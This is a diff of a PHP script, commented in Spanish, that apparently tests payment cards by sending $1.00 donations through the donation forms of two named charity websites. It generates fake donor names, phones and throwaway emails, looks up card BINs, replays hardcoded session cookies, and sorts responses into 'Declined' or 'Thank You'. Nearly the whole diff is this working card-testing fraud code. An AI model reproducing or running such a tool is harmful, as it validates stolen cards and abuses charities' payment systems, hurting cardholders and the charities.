@@ -54,28 +54,64 @@ $BinData = BinData($bin); //Extrae los datos del bin
 
 
 ////RANDOM USER//
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-$get = curl_exec($ch);
-curl_close($ch);
-        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
-        $name = $matches1[1][0];
-        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
-        $last = $matches1[1][0];
-        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
-        $email = $matches1[1][0];
-        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
-	$street = $matches1[1][0];
-        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
-        $city = $matches1[1][0];
-        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
-        $state = $matches1[1][0];
-        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
-        $phone = $matches1[1][0];
-        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
-        $postcode = $matches1[1][0];
+
+
+
+
+
+
+
+// Nombres
+$names = array(
+    'Juan', 'María', 'Pedro', 'Ana', 'Luis', 'Sofía', 'Carlos', 'Elena', 'Alejandro', 'Isabel'
+);
+
+// Apellidos
+$lastNames = array(
+    'García', 'Rodríguez', 'González', 'Martínez', 'Hernández', 'López', 'Díaz', 'Pérez', 'Sánchez', 'Ramírez'
+);
+$lastNames2 = array(
+    'García', 'Rodríguez', 'González', 'Martínez', 'Hernández', 'López', 'Díaz', 'Pérez', 'Sánchez', 'Ramírez'
+);
+
+// Números de teléfono
+function generatePhoneNumber() {
+    $areaCode = rand(200, 999);
+    $prefix = rand(200, 999);
+    $lineNumber = rand(1000, 9999);
+    return "($areaCode) $prefix-$lineNumber";
+}
+
+// Generar datos
+$name = $names[array_rand($names)];
+$last = $lastNames[array_rand($lastNames)];
+$last2 = $lastNames2[array_rand($lastNames2)];
+$lasts = "$last $last2";
+$phone = generatePhoneNumber();
+
+// Imprimir datos
+echo "Nombre: $name $lasts\n";
+echo "Teléfono: $phone\n";
+
+
+
+////GENRADOR DE CORREO///
+$response = file_get_contents('https://www.fakemailgenerator.com');
+preg_match('/value="([^"]+)"/', $response, $matches);
+$GmailUser = $matches[1];
+//---------------------------//
+// Extraer el valor del dominio
+preg_match('/<span id="domain">([^<]+)<\/span>/', $response, $matches);
+$dominio = trim($matches[1]);
+// Eliminar espacios en blanco
+//---------------------------//
+$usr = str_replace("@", "", $dominio);
+//---------------------------//
+$email = "$GmailUser$dominio";
+echo "$email\n";
+
+
+
 
 $curl = curl_init();
 
@@ -108,7 +144,9 @@ curl_close($curl);
 
 
 
+
 $curl = curl_init();
+
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://www.theofilosfoundation.org.au/donate/?payment-mode=stripe_checkout&form-id=79069',
   CURLOPT_RETURNTRANSFER => true,
@@ -117,80 +155,95 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'give-honeypot=&give-form-id-prefix=79069-1&give-form-id=79069&give-form-title=Donation+Form&give-current-url=https%3A%2F%2Fwww.theofilosfoundation.org.au%2Fdonate%2F&give-form-url=https%3A%2F%2Fwww.theofilosfoundation.org.au%2Fdonate%2F&give-form-minimum=1.00&give-form-maximum=999999.99&give-form-hash=c913e1be37&give-price-id=custom&give-amount=1.00&give_stripe_payment_method='.$id.'&payment-mode=stripe_checkout&give_first='.$name.'&give_last='.$last.'&give_email='.$email.'&card_name='.$name.'+'.$last.'+Lopez+&give_validate_stripe_payment_fields=1&give_action=purchase&give-gateway=stripe_checkout',
-  CURLOPT_COOKIE => 'uncode_privacy[consent_types]=%5B%5D; uncodeAI.screen=360; uncodeAI.images=2064; uncodeAI.css=360x800@16; __stripe_mid=fdc8fd8d-c28e-4ed7-a4fb-6f4b07e0e1ba61aee8; __stripe_sid=758deca0-c28a-4aec-9636-20e776dc0656d25599; wp-give_session_9d6049e39fa0e46fc282c55d085c1902=ff3f4f8799b2ae44f86f3fe034019d17%7C%7C1743432347%7C%7C1743428747%7C%7Cbfab638ea45ddfca460abbc33298e619; wp-give_session_reset_nonce_9d6049e39fa0e46fc282c55d085c1902=1',
+  CURLOPT_POSTFIELDS => 'give-honeypot=&give-form-id-prefix=79069-1&give-form-id=79069&give-form-title=Donation Form&give-current-url=https://www.theofilosfoundation.org.au/donate/&give-form-url=https://www.theofilosfoundation.org.au/donate/&give-form-minimum=1.00&give-form-maximum=999999.99&give-form-hash=11c9475b49&give-price-id=custom&give-amount=1.00&give_stripe_payment_method='.$id.'&payment-mode=stripe_checkout&give_first='.$name.'&give_last='.$last.'&give_email='.$email.'&card_name='.$last.'&give_validate_stripe_payment_fields=1&give_action=purchase&give-gateway=stripe_checkout',
+//  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
+  CURLOPT_COOKIE => 'uncode_privacy[consent_types]=%5B%5D; uncodeAI.screen=360; uncodeAI.images=2064; uncodeAI.css=360x800@16; __stripe_mid=27199be9-23e9-406d-86f8-574d3cd66c03aeae31; __stripe_sid=8e907dfc-7a28-4f9d-a6af-d12e455605e7932b5d; wp-give_session_9d6049e39fa0e46fc282c55d085c1902=a343106e83ec289ea7b43db6847ebafa%7C%7C1746304422%7C%7C1746300822%7C%7C3e141ff8b7de9dc5f82b0533687ef89f; wp-give_session_reset_nonce_9d6049e39fa0e46fc282c55d085c1902=1',
+//  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
+//    'Accept-Encoding: gzip, deflate, br, zstd',
     'Content-Type: application/x-www-form-urlencoded',
+//    'cache-control: max-age=0',
+//    'sec-ch-ua: "Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+//    'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-platform: "Android"',
     'origin: https://www.theofilosfoundation.org.au',
-    'accept-language: es-US,es;q=0.9',
+//    'upgrade-insecure-requests: 1',
+//    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.7',
+//    'sec-fetch-site: same-origin',
+//    'sec-fetch-mode: navigate',
+//    'sec-fetch-user: ?1',
+//    'sec-fetch-dest: document',
     'referer: https://www.theofilosfoundation.org.au/donate/?form-id=79069',
+//    'priority: u=0, i',
   ],
 ]);
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
+echo "$response\n";
 curl_close($curl);
 $patron = '/<p><strong>Error<\/strong>: (.*)<\/p>/';
 preg_match($patron, $response, $coincidencia);
 $respo = $coincidencia[1];
-echo "$respo\n";
+
 
 
 $curl = curl_init();
 curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://www.theofilosfoundation.org.au/donation-confirmation/',
+  CURLOPT_URL => 'https://www.theofilosfoundation.org.au/donate/?form-id=79069&=',
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_ENCODING => '',
   CURLOPT_MAXREDIRS => 10,
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIE => 'uncode_privacy[consent_types]=%5B%5D; uncodeAI.screen=360; uncodeAI.images=2064; uncodeAI.css=360x800@16; __stripe_mid=fdc8fd8d-c28e-4ed7-a4fb-6f4b07e0e1ba61aee8; __stripe_sid=758deca0-c28a-4aec-9636-20e776dc0656d25599; wp-give_session_9d6049e39fa0e46fc282c55d085c1902=ff3f4f8799b2ae44f86f3fe034019d17%7C%7C1743432347%7C%7C1743428747%7C%7Cbfab638ea45ddfca460abbc33298e619; wp-give_session_reset_nonce_9d6049e39fa0e46fc282c55d085c1902=1',
+//  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
+//  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
+  CURLOPT_COOKIE => 'uncode_privacy[consent_types]=%5B%5D; uncodeAI.screen=360; uncodeAI.images=2064; uncodeAI.css=360x800@16; __stripe_mid=27199be9-23e9-406d-86f8-574d3cd66c03aeae31; __stripe_sid=8e907dfc-7a28-4f9d-a6af-d12e455605e7932b5d; wp-give_session_9d6049e39fa0e46fc282c55d085c1902=a343106e83ec289ea7b43db6847ebafa%7C%7C1746304422%7C%7C1746300822%7C%7C3e141ff8b7de9dc5f82b0533687ef89f; wp-give_session_reset_nonce_9d6049e39fa0e46fc282c55d085c1902=1',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
+    'Accept-Encoding: gzip, deflate, br, zstd',
+    'cache-control: max-age=0',
     'upgrade-insecure-requests: 1',
-    'accept-language: es-US,es;q=0.9',
+    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.7',
+    'sec-fetch-site: same-origin',
+    'sec-fetch-mode: navigate',
+    'sec-fetch-user: ?1',
+    'sec-fetch-dest: document',
+    'sec-ch-ua: "Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+    'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-platform: "Android"',
     'referer: https://www.theofilosfoundation.org.au/donate/?form-id=79069',
+    'priority: u=0, i',
   ],
 ]);
+/*
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$patron = '/<p><strong>Error<\/strong>: (.*)<\/p>/';
+preg_match($patron, $response, $coincidencia);
+$mensaje2 = $coincidencia[1];
+curl_close($curl);
+echo "MENSAJE2: $mensaje2\n";
+*/
+
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
+//file_put_contents('/sdcard/index.html', $response);
 curl_close($curl);
 
 
-$curl = curl_init();
-curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://www.theofilosfoundation.org.au/wp-admin/admin-ajax.php?action=get_receipt&shortcode_atts=%7B%22error%22%3A%22You+are+missing+the+donation+id+to+view+this+donation+receipt.%22%2C%22price%22%3Atrue%2C%22donor%22%3Atrue%2C%22date%22%3Atrue%2C%22payment_method%22%3Atrue%2C%22payment_id%22%3Atrue%2C%22payment_status%22%3Afalse%2C%22company_name%22%3Afalse%2C%22status_notice%22%3Atrue%7D&donation_id=79340&receipt_type=&wp-give_session_9d6049e39fa0e46fc282c55d085c1902=ff3f4f8799b2ae44f86f3fe034019d17%257C%257C1743432347%257C%257C1743428747%257C%257Cbfab638ea45ddfca460abbc33298e619',
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_ENCODING => '',
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 30,
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIE => 'uncode_privacy[consent_types]=%5B%5D; uncodeAI.screen=360; uncodeAI.images=2064; uncodeAI.css=360x800@16; __stripe_mid=fdc8fd8d-c28e-4ed7-a4fb-6f4b07e0e1ba61aee8; __stripe_sid=758deca0-c28a-4aec-9636-20e776dc0656d25599; wp-give_session_9d6049e39fa0e46fc282c55d085c1902=ff3f4f8799b2ae44f86f3fe034019d17%7C%7C1743432347%7C%7C1743428747%7C%7Cbfab638ea45ddfca460abbc33298e619; wp-give_session_reset_nonce_9d6049e39fa0e46fc282c55d085c1902=1',
-  CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
-    'sec-ch-ua-platform: "Android"',
-    'x-requested-with: XMLHttpRequest',
-    'accept-language: es-US,es;q=0.9',
-    'referer: https://www.theofilosfoundation.org.au/donation-confirmation/',
-    'priority: u=1, i',
-  ],
-]);
-
-$response = curl_exec($curl);
-$err = curl_error($curl);
-file_put_contents('/sdcard/index.html', $response);
-curl_close($curl);
-
-
-$partes = explode("Error<\/strong>:", $response);
-$respo = trim(explode("<\/p>", $partes[1])[0]);
-
+//$partes = explode("Error<\/strong>:", $response);
+//$respo = trim(explode("<\/p>", $partes[1])[0]);
+if(empty($respo)){
+$patron = '/<p><strong>Error<\/strong>: (.*)<\/p>/';
+preg_match($patron, $response, $coincidencia);
+$respo = $coincidencia[1];
+}
 
 if(empty($respo)){
 $partes = explode("Payment Complete: ", $response);
@@ -202,7 +255,7 @@ $respo = "Thank You.";
 }
 
 if ($respo == "Error creating payment intent with Stripe. Please try again.") {
-$respo = "Declined";
+$respo = "Declined.";
 }
 
 
@@ -887,6 +940,55 @@ $startTime = microtime(true); //TIEMPO DE INICIO
 $BinData = BinData($bin); //Extrae los datos del bin
 
 
+
+
+///generador de nombres///
+$names = array(
+    'Juan', 'María', 'Pedro', 'Ana', 'Luis', 'Sofía', 'Carlos', 'Elena', 'Alejandro', 'Isabel'
+);
+
+// Apellidos
+$lastNames = array(
+    'García', 'Rodríguez', 'González', 'Martínez', 'Hernández', 'López', 'Díaz', 'Pérez', 'Sánchez', 'Ramírez'
+);
+
+// Números de teléfono
+function generatePhoneNumber() {
+    $areaCode = rand(200, 999);
+    $prefix = rand(200, 999);
+    $lineNumber = rand(1000, 9999);
+    return "($areaCode) $prefix-$lineNumber";
+}
+
+// Generar datos
+$name = $names[array_rand($names)];
+$last = $lastNames[array_rand($lastNames)];
+$phone = generatePhoneNumber();
+
+// Imprimir datos
+echo "Nombre: $name $last\n";
+echo "Teléfono: $phone\n";
+
+
+//Generador de correos///
+$response = file_get_contents('https://www.fakemailgenerator.com');
+preg_match('/value="([^"]+)"/', $response, $matches);
+$GmailUser = $matches[1];
+//---------------------------//
+// Extraer el valor del dominio
+preg_match('/<span id="domain">([^<]+)<\/span>/', $response, $matches);
+$dominio = trim($matches[1]);
+// Eliminar espacios en blanco
+//---------------------------//
+$usr = str_replace("@", "", $dominio);
+//---------------------------//
+$email = "$GmailUser$dominio";
+echo "$email\n";
+
+
+
+
+
 $curl = curl_init('https://binlist.io/lookup/'.$bin.'');
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
@@ -903,46 +1005,8 @@ $MV = ucwords(strtolower(trim($brand)));
 echo "$MV\n";
 
 
-//generador de correos //
 
-//RANDOM USER//
-// Nombres
-$names = array(
-    'Juan', 'María', 'Pedro', 'Ana', 'Luis', 'Sofía', 'Carlos', 'Elena', 'Alejandro', 'Isabel'
-);
-// Apellidos
-$lastNames = array(
-    'García', 'Rodríguez', 'González', 'Martínez', 'Hernández', 'López', 'Díaz', 'Pérez', 'Sánchez', 'Ramírez'
-);
 
-// Números de teléfono
-function generatePhoneNumber() {
-    $areaCode = rand(200, 999);
-    $prefix = rand(200, 999);
-    $lineNumber = rand(1000, 9999);
-    return "($areaCode) $prefix-$lineNumber";
-}
-// Generar datos
-$name = $names[array_rand($names)];
-$last = $lastNames[array_rand($lastNames)];
-$phone = generatePhoneNumber();
-// Imprimir datos
-echo "Nombre: $name $lastName\n";
-echo "Teléfono: $phone\n";
-
-$response = file_get_contents('https://www.fakemailgenerator.com');
-preg_match('/value="([^"]+)"/', $response, $matches);
-$GmailUser = $matches[1];
-//---------------------------//
-// Extraer el valor del dominio
-preg_match('/<span id="domain">([^<]+)<\/span>/', $response, $matches);
-$dominio = trim($matches[1]);
-// Eliminar espacios en blanco
-//---------------------------//
-$usr = str_replace("@", "", $dominio);
-//---------------------------//
-$email = "$GmailUser$dominio";
-	
 
 $curl = curl_init();
 curl_setopt_array($curl, [
@@ -953,27 +1017,26 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
-//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=L3-wSSrvWF1VenBcxUQjDf_wCZj61iGwqNozFzB9mdQ',
+  //CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=aELNrrabJDSh0i98o-qo92Imh4ellN7ekaB4kuxoVek',
   CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
   CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
     'Accept-Encoding: gzip, deflate, br, zstd',
+    'cache-control: max-age=0',
     'sec-ch-ua: "Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
     'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-platform: "Android"',
     'upgrade-insecure-requests: 1',
     'sec-gpc: 1',
     'accept-language: es-US,es;q=0.5',
-    'sec-fetch-site: same-origin',
+    'sec-fetch-site: none',
     'sec-fetch-mode: navigate',
     'sec-fetch-user: ?1',
     'sec-fetch-dest: document',
-    'referer: https://breastcancereducation.org/civicrm/contribute/transact?_qf_Main_display=true&qfKey=f415de1bd5cf1d36ed1d91528bc981aa50ebc1fb8bf3dabe04029dba07c2fa68_7835',
     'priority: u=0, i',
   ],
 ]);
-
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
@@ -990,13 +1053,10 @@ echo "qfKey: $qfKey\n";
 echo "MAX_FILE_SIZE: $MAX_FILE_SIZE\n";
 echo "-------------------------------\n";
 
-/*
-    'qfKey' => 'f415de1bd5cf1d36ed1d91528bc981aa50ebc1fb8bf3dabe04029dba07c2fa68_4778',
-    'MAX_FILE_SIZE' => '2097152',
-		f415de1bd5cf1d36ed1d91528bc981aa50ebc1fb8bf3dabe04029dba07c2fa68_4778
-  CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfK=f415de1bd5cf1d36ed1d91528bc981aa50ebc1fb8bf3dabe04029dba07c2fa68_4778',
 
-*/
+
+
+
 $curl = curl_init();
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact',
@@ -1038,13 +1098,13 @@ curl_setopt_array($curl, [
     'billing_street_address-5' => '6195 bollinger rd',
     'billing_city-5' => 'New york',
     'billing_country_id-5' => '1228',
-    'billing_state_province_id-5' => '1002',
+    'billing_state_province_id-5' => '1031',
     'billing_postal_code-5' => '10080',
     '_qf_Main_upload' => '1',
   ],
+//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=aELNrrabJDSh0i98o-qo92Imh4ellN7ekaB4kuxoVek',
   CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
   CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
-//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=L3-wSSrvWF1VenBcxUQjDf_wCZj61iGwqNozFzB9mdQ',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
     'Accept-Encoding: gzip, deflate, br, zstd',
@@ -1067,7 +1127,7 @@ curl_setopt_array($curl, [
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
-
+//file_put_contents('/sdcard/index.html', $response);
 curl_close($curl);
 
 if ($err) {
@@ -1075,7 +1135,6 @@ if ($err) {
 } else {
   echo $response;
 }
-
 
 
 
@@ -1091,7 +1150,7 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
-//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=L3-wSSrvWF1VenBcxUQjDf_wCZj61iGwqNozFzB9mdQ',
+  //CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=aELNrrabJDSh0i98o-qo92Imh4ellN7ekaB4kuxoVek',
   CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
   CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
   CURLOPT_HTTPHEADER => [
@@ -1124,6 +1183,7 @@ echo "qfKey: $qfKey2\n";
 
 
 
+
 $curl = curl_init();
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact',
@@ -1133,10 +1193,10 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'qfKey='.$qfKey2.'&_qf_default=Confirm:next&_qf_Confirm_next=1&custom_28=&custom_29=&custom_31=&custom_30=',
+  CURLOPT_POSTFIELDS => 'qfKey='.$qfKey.'&_qf_default=Confirm:next&_qf_Confirm_next=1&custom_28=&custom_29=&custom_31=&custom_30=',
   CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
   CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
-//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=L3-wSSrvWF1VenBcxUQjDf_wCZj61iGwqNozFzB9mdQ',
+//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=aELNrrabJDSh0i98o-qo92Imh4ellN7ekaB4kuxoVek',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
     'Accept-Encoding: gzip, deflate, br, zstd',
@@ -1153,30 +1213,32 @@ curl_setopt_array($curl, [
     'sec-fetch-mode: navigate',
     'sec-fetch-user: ?1',
     'sec-fetch-dest: document',
-    'referer: https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfKey2.'',
+    'referer: https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfKey.'',
     'priority: u=0, i',
   ],
 ]);
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
+
 curl_close($curl);
+
 
 
 
 
 $curl = curl_init();
 curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact?_qf_Main_display=true&qfKey='.$qfKey2.'',
+  CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact?_qf_Main_display=true&qfKey='.$qfKey.'',
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_ENCODING => '',
   CURLOPT_MAXREDIRS => 10,
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
-  //CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=L3-wSSrvWF1VenBcxUQjDf_wCZj61iGwqNozFzB9mdQ',
   CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
   CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
+//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=aELNrrabJDSh0i98o-qo92Imh4ellN7ekaB4kuxoVek',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
     'Accept-Encoding: gzip, deflate, br, zstd',
@@ -1191,18 +1253,13 @@ curl_setopt_array($curl, [
     'sec-ch-ua: "Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
     'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-platform: "Android"',
-    'referer: https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfKey2.'',
+    'referer: https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfKey.'',
     'priority: u=0, i',
   ],
 ]);
 
-echo "error1\n";
-
 $response = curl_exec($curl);
-//file_put_contents('/sdcard/index.html', $response);
-//$response = file_get_contents('index.html');
 $err = curl_error($curl);
-
 
 $patron = '/<span class="msg-text">(.*?)<\/span>/';
 preg_match($patron, $response, $coincidencias);
@@ -1228,7 +1285,7 @@ $mensaje =  $match[0];
 echo "Me5: $mensaje\n";
 }
 
-$respo = $mensaje;
+$respo = "$mensaje";
 	
 curl_close($curl);
 
